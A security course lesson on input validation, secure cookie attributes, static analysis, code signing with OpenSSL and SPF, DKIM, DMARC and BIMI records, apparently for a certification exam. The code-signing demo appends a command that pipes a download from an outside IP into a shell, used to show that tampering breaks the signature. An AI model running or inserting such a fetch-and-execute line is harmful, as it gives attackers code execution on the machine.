---
title: Application and Email Security Controls
summary: Validate input on the server with allow lists, set secure cookies, run static analysis and secrets scanning on every commit, sign what you release, and authenticate your mail domain with SPF, DKIM, DMARC and BIMI records (SY0-801 objective 4.1).
minutes: 40
objectives:
  - Validate input with allow lists and set cookies with Secure, HttpOnly, SameSite and the __Host- prefix
  - Explain what static code analysis, secrets scanning and code signing each catch, and sign and verify a release
  - Read and write SPF, DKIM, DMARC and BIMI DNS records and explain how DMARC alignment stops spoofing of the From address
---

## Outline

1. Input validation
2. Secure cookies
3. Static analysis and secrets scanning
4. Code signing
5. Email authentication: SPF, DKIM, DMARC
6. BIMI

## Input validation

**Input validation** checks that data crossing into the application is what it should be, before anything uses it. The OWASP cheat sheet's rules: validate on the **server** (browser checks are for convenience; attackers skip them), prefer **allow lists** (what is permitted) to deny lists (what is forbidden), check type, length, format and range, and **reject** bad input instead of trying to repair it. A booking form of a veterinary clinic:

```python
import re
from datetime import date

PET_ID = re.compile(r"PET-\d{6}")
SPECIES = {"cat", "dog", "rabbit", "bird"}


def validate_booking(form):
    """Return a clean booking or raise ValueError; never repair bad input."""
    pet_id = form.get("pet_id", "").strip()
    if not PET_ID.fullmatch(pet_id):
        raise ValueError("pet_id must look like PET-123456")
    species = form.get("species", "").strip().lower()
    if species not in SPECIES:
        raise ValueError("unknown species")
    day = date.fromisoformat(form.get("day", ""))  # raises ValueError itself
    if not date(2026, 10, 1) <= day <= date(2027, 3, 31):
        raise ValueError("day outside the booking window")
    notes = form.get("notes", "")
    if len(notes) > 500:
        raise ValueError("notes longer than 500 characters")
    return {"pet_id": pet_id, "species": species, "day": day, "notes": notes}
```

Four submitted forms, one good and three bad (an injection probe in `pet_id`, an unknown species, an impossible date):

```text
ok: {'pet_id': 'PET-004211', 'species': 'dog', 'day': datetime.date(2026, 11, 3), 'notes': 'limping'}
rejected: pet_id must look like PET-123456
rejected: unknown species
rejected: month must be in 1..12, not 13
```

The free-text `notes` field cannot be allow-listed, so validation only limits its length; the defenses for it are parameterized queries when storing it and output encoding when displaying it. Validation narrows what reaches the code; it does not replace those.

## Secure cookies

A session cookie is as good as a password while it lives. Set it with every protective attribute:

```http
Set-Cookie: __Host-session=9Qv3tq0LJm2x8Kc1; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
```

- `Secure`: sent only over HTTPS.
- `HttpOnly`: JavaScript cannot read it, so a cross-site scripting bug cannot simply steal it.
- `SameSite=Lax` (or `Strict`): not sent on most cross-site requests, which blunts cross-site request forgery. `SameSite=None` requires `Secure`.
- The `__Host-` prefix: browsers accept the cookie only if it is `Secure`, has `Path=/` and no `Domain`, so a sibling subdomain cannot overwrite it.
- `Max-Age`: a short lifetime limits a stolen cookie's value.

## Static analysis and secrets scanning

**Static code analysis** (SAST, static application security testing) reads source code without running it and flags dangerous patterns: SQL built by string formatting, `subprocess` with `shell=True`, weak hashing. Tools such as Semgrep, Bandit and CodeQL run in the pipeline on every change. Expect false positives; triage them and suppress each with a recorded reason. Dynamic testing (DAST) attacks the running application and finds what static analysis cannot see, such as a missing header.

**Secrets scanning** looks for API keys, private keys and passwords in repositories, using known token formats and entropy. GitHub's push protection blocks a push that contains a recognized secret; gitleaks does the same in a pre-commit hook or pipeline. If a secret was ever pushed, **revoke and rotate it**: deleting the commit does not help, because clones and forks already have it.

## Code signing

**Code signing** attaches a digital signature to software, so users and systems can check who published it and that nobody changed it since. Windows Authenticode, Apple notarization, package managers and Sigstore all build on the same operation, shown here with OpenSSL on a small agent script:

```console
$ openssl genpkey -algorithm ed25519 -out release.key
$ openssl pkey -in release.key -pubout -out release.pub
$ openssl pkeyutl -sign -inkey release.key -rawin -in agent-3.1.0.sh -out agent-3.1.0.sh.sig
$ openssl pkeyutl -verify -pubin -inkey release.pub -rawin -in agent-3.1.0.sh -sigfile agent-3.1.0.sh.sig
Signature Verified Successfully
$ echo "curl -s http://203.0.113.50/x | sh" >> agent-3.1.0.sh
$ openssl pkeyutl -verify -pubin -inkey release.pub -rawin -in agent-3.1.0.sh -sigfile agent-3.1.0.sh.sig
Signature Verification Failure
```

One appended line breaks the signature. A signature proves only that the key holder signed: keep the signing key in an HSM or a managed signing service, never on a build agent's disk, because attackers who steal it can sign malware that every check will trust.

## Email authentication: SPF, DKIM, DMARC

SMTP lets any server claim any sender. Three DNS-published mechanisms let receivers check. Records for a fictional freight company (the DKIM key is shortened):

```text
kestrel-freight.example.  3600 IN TXT "v=spf1 ip4:198.51.100.25 include:_spf.mailhost.example -all"
sel2026._domainkey.kestrel-freight.example.  3600 IN TXT "v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...IDAQAB"
_dmarc.kestrel-freight.example.  3600 IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc-reports@kestrel-freight.example; adkim=s"
```

**SPF** (Sender Policy Framework, RFC 7208) lists the servers allowed to send for the domain in the envelope sender (the SMTP `MAIL FROM`). Mechanisms such as `ip4`, `include`, `a` and `mx` are tried left to right; the qualifier on `all` says what happens to everything else: `-all` fail, `~all` softfail, `?all` neutral, and `+all` (or plain `all`) passes the whole internet, which makes the record worthless. A domain must have only one SPF record (two cause a `permerror`), evaluation may cause at most 10 DNS lookups, and a record split into several quoted strings is joined without spaces.

**DKIM** (DomainKeys Identified Mail, RFC 6376) signs headers and body. The sender adds a header; the receiver fetches the public key from `<selector>._domainkey.<domain>`:

```text
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kestrel-freight.example;
        s=sel2026; t=1791702000; h=from:to:subject:date:message-id;
        bh=2jUSOH9NhtVGCQWNr9BrIAPreKQjO6Sn7XIkfJVOzv8=; b=Kx8eV3q...
Authentication-Results: mx.receiver.example;
        spf=pass smtp.mailfrom=kestrel-freight.example;
        dkim=pass header.d=kestrel-freight.example header.s=sel2026;
        dmarc=pass header.from=kestrel-freight.example
```

RFC 8301 forbids `rsa-sha1` and says signers should use RSA keys of at least 2048 bits. Selectors let you rotate keys: publish `sel2027`, switch, then empty the old record's `p=`.

Neither SPF nor DKIM checks the **From** address the reader sees. **DMARC** (Domain-based Message Authentication, Reporting and Conformance) does: a message passes only if SPF or DKIM passes **and** that passing domain **aligns** with the From domain. **Relaxed** alignment (the default) accepts the same organizational domain (`mail.kestrel-freight.example` aligns with `kestrel-freight.example`); **strict** (`adkim=s`, `aspf=s`) requires identical names. The policy `p=` asks receivers what to do with failures: `none` (monitor only), `quarantine` (treat as suspicious) or `reject`. `rua=` receives daily aggregate reports, which show every server sending as you. Roll out `p=none` first, fix the legitimate senders the reports reveal, then move to `quarantine` and `reject`.

DMARC was specified in the informational RFC 7489; in May 2026 RFC 9989 obsoleted it and moved DMARC to the Standards Track. Records still start `v=DMARC1`. RFC 9989 removed the `pct`, `rf` and `ri` tags (receivers ignore unknown tags, so old records still work), added `np` for non-existent subdomains and `t=y` for testing, and finds the organizational domain by a DNS tree walk instead of a public suffix list. A domain that sends no mail should publish `v=spf1 -all` and `v=DMARC1; p=reject;` so nobody can spoof it.

## BIMI

**BIMI** (Brand Indicators for Message Identification) lets a domain show its logo next to authenticated mail in supporting mailboxes:

```text
default._bimi.kestrel-freight.example. 3600 IN TXT "v=BIMI1; l=https://brand.kestrel-freight.example/logo.svg; a=https://brand.kestrel-freight.example/vmc.pem"
```

`l=` points to the logo in SVG Tiny PS format and `a=` to a Verified Mark Certificate (VMC, for a registered trademark) or Common Mark Certificate (CMC). Mailbox providers show it only when DMARC is at enforcement, `quarantine` or `reject`. BIMI is an IETF Internet-Draft (an individual submission, revision 14 in May 2026), not yet a standard; it rewards strong authentication rather than adding protection.

## Common mistakes

- Validating only in the browser, or deny-listing characters such as `'`.
- Session cookies without `HttpOnly` and `Secure`.
- Deleting a leaked key from Git history without revoking it.
- `+all` in SPF, two SPF records, or more than 10 lookups after adding one more `include`.
- Leaving DMARC at `p=none` forever, which reports spoofing but stops none of it.

## Practice

1. Which attribute stops page JavaScript from reading a cookie, and which prefix stops a subdomain overwriting it?
2. Is `"v=spf1 include:_spf.mailhost.example ?all"` a strong SPF record?
3. A phishing message has `From: payroll@kestrel-freight.example` and a valid DKIM signature for `d=cheap-mailer.example`. What does DMARC conclude?
4. Write the DMARC record for a parked domain.

### Answers

1. `HttpOnly`; `__Host-`.
2. No: `?all` is neutral, so unlisted servers are neither passed nor failed. Use `-all` (or `~all` while testing) with DMARC.
3. Fail: the DKIM domain does not align with the From domain, and with `p=reject` the receiver should reject it.
4. `_dmarc.parked.example. IN TXT "v=DMARC1; p=reject;"` with `v=spf1 -all` beside it.

## Key takeaways

- Validate on the server with allow lists and reject what fails; encode output and parameterize queries too.
- Cookies: `Secure`, `HttpOnly`, `SameSite`, `__Host-`, short lifetimes.
- SAST and secrets scanning run on every commit; a leaked secret must be rotated.
- Code signing proves publisher and integrity only while the key stays protected.
- SPF authorizes servers, DKIM signs messages, DMARC ties both to the visible From and sets policy; BIMI shows a logo once DMARC is enforced.

## Further reading

- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)
- [RFC 7208: Sender Policy Framework](https://www.rfc-editor.org/rfc/rfc7208.html)
- [RFC 6376: DomainKeys Identified Mail Signatures](https://www.rfc-editor.org/rfc/rfc6376.html)
- [RFC 9989: DMARC](https://www.rfc-editor.org/rfc/rfc9989.html)
- [BIMI Internet-Draft](https://datatracker.ietf.org/doc/draft-brand-indicators-for-message-identification/)
